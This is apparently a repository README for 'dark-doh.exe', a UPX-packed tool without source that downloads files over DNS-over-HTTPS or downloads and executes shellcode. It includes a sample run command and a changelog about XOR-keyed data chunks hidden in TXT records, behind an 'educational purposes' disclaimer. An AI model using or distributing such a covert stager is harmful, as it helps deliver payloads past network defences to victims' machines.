dark-doh.exe public version

Purpose: Download files via DoH, or download and execute a shellcode

- Run example: dark-doh.exe file1 download google yourdomain.com

- The supporting python script added.

No src for a moment, maybe will be added later. Packed by UPX.

!!! Disclaimer !!!
- The authors do not have any responsibility and/or liability for how you will use the dark-doh.exe!
- Everything that anyone can find in this repository is only for educational and research purposes, and the authors have no responsibility for how you will use the data found.


Changelog:
- dark-doh-v1.0rc-public.exe release:
  - data download
  - Google as DoH provider
  - data chunks and XOR-key (4 bytes) are stored in the TXT record
  - data chunks are stored in the alphanumeric format
